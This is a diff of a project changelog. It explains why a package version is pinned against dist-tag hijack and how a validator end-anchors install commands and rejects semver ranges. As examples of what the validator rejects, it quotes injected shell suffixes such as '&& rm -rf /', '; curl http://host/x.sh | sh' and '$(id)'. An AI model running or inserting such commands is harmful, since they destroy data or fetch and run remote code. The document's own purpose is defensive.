@@ -19,15 +19,20 @@ project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   machines without git are no longer reported as blocked for this hook.
 
   The version is **deliberately pinned rather than a floating `latest`** — see
-  `BROWSERPLAN_PINNED_VERSION`, and please do not "improve" it back. Once the
-  source repository is retired, npm is the *sole* artifact for this package: one
-  version, raw TypeScript, no maintainer watching the name. A floating dist-tag
-  would let a hijacked or mistakenly-moved tag deliver arbitrary code to every
-  fleet machine through a hook whose command is `bun install -g`. The usual
-  argument for a floating tag — that a pin cannot deliver a future fix — costs
-  nothing here, because republishing requires someone to deliberately hold the
-  source mirror, and that same change can bump the constant. A pin is also the
-  only form `machines reconcile` can verify.
+  `BROWSERPLAN_PINNED_VERSION`, and please do not "improve" it back. The decisive
+  reason is **auditability**: the published metadata carries
+  `gitHead: f49b5c42…`, which resolves to nothing once the source repository is
+  retired, so if a floating tag ever moved after that point there would be no
+  diff, no history and no provenance to inspect — and this hook installs it
+  silently. A pin also gives `machines reconcile` something to verify, since it
+  asserts `<bin> --version` equals the target, which only works against an exact
+  version. Secondarily, npm becomes the sole artifact (one version, raw
+  TypeScript, no maintainer watching the name), so a moved dist-tag would reach
+  every fleet machine through a `bun install -g`. The usual argument for a
+  floating tag — that a pin cannot deliver a future fix — costs nothing here,
+  because republishing requires someone to deliberately hold the source mirror,
+  and that same change can bump the constant. `dist-tags` is
+  `{"latest":"0.1.0"}` today, so the pin currently costs nothing at all.
 
   No version *placeholder* is exposed either, because **nothing in this package
   could resolve one**: `getPackageVersion()` returns *machines*' own version, and
@@ -96,15 +101,24 @@ project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   released version validates, but the rule is stricter than 0.2.2 for hand-edited
   input rather than a pure superset of it.
 
-  The version suffix is **end-anchored**. That matters more than the prefix: a
-  prefix-only check accepts anything appended after a valid install — `…@latest &&
-  rm -rf /`, `…@latest; curl http://host/x.sh | sh`, `…@latest; cd d && git pull` —
-  and an empty version. Those are rejected, as are git-based rewrites
-  (`git fetch && git reset --hard`, `git -C <dir> pull`, `git clone`). This is an
-  allowlist of command *shape*, not a `git pull` phrase denylist, which would have
-  been trivially evadable. It is not a trust check: a legitimate but
-  hostile-looking dist-tag such as `latest-evil` is within the npm tag charset and
-  is accepted.
+  The version suffix is **end-anchored**, and that matters more than the prefix: a
+  prefix-only check accepts anything appended after a valid install — `…@0.1.0 &&
+  rm -rf /`, `…@0.1.0; curl http://host/x.sh | sh`, `…@0.1.0; cd d && git pull`,
+  `` `id` ``, `$(id)` — and an empty version. All rejected, as are git-based
+  rewrites (`git fetch && git reset --hard`, `git -C <dir> pull`, `git clone`).
+  This is an allowlist of command *shape*, not a `git pull` phrase denylist, which
+  would have been trivially evadable.
+
+  The suffix must be an **exact semver or a dist-tag of two or more characters**.
+  Semver *ranges* are rejected — `0`, `1.2`, `0.x`, `0*`, `^1.0.0`, `~1.0.0` and
+  the bare wildcards `x`/`X` — because a range makes the installed version
+  unpredictable, defeating both the pin and reconcile's `<bin> --version`
+  assertion; `0*` is additionally a shell glob whose expansion depends on the
+  caller's working directory. The pattern is a shared module-level object and is
+  asserted to carry **no flags**, since a `/g` added later would advance
+  `lastIndex` between calls and return alternating results for successive machines
+  in one payload. It is not a trust check: a legitimate but hostile-looking
+  dist-tag such as `latest-evil` is accepted.
 - Every other BrowserPlan surface is unchanged — owner ids, target name, machine
   ids, operation ids, stable surfaces — and
   `schemas/machines-consumer.schema.json` is byte-for-byte identical, because the
